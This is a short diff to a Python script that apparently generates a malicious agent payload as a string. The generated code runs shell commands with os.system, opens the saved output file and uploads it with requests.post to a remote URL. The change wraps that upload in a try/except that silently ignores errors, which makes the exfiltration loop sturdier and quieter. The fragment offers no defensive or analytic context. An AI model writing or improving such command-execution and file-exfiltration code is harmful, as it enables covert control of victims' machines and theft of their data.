@@ -235,8 +235,11 @@ import requests
     payload += "            os.system({0} + {1})\n".format(com, save)
     payload += "            with open({0}, 'rb') as f:\n".format(obj)
     payload += "                file = {'file': (%s, f)}\n" % obj
-    payload += "                requests.post({0}['url'], data={0}['fields'], files=file)\n".format(body)
-    payload += "            {0} = {1}\n\n".format(old, com)
+    payload += "                try:\n"
+    payload += "                    requests.post({0}['url'], data={0}['fields'], files=file)\n".format(body)
+    payload += "                    {0} = {1}\n\n".format(old, com)
+    payload += "                except:\n"
+    payload += "                    pass\n"
     payload += "if __name__ == '__main__':\n"
     payload += "    %s()" % func
 
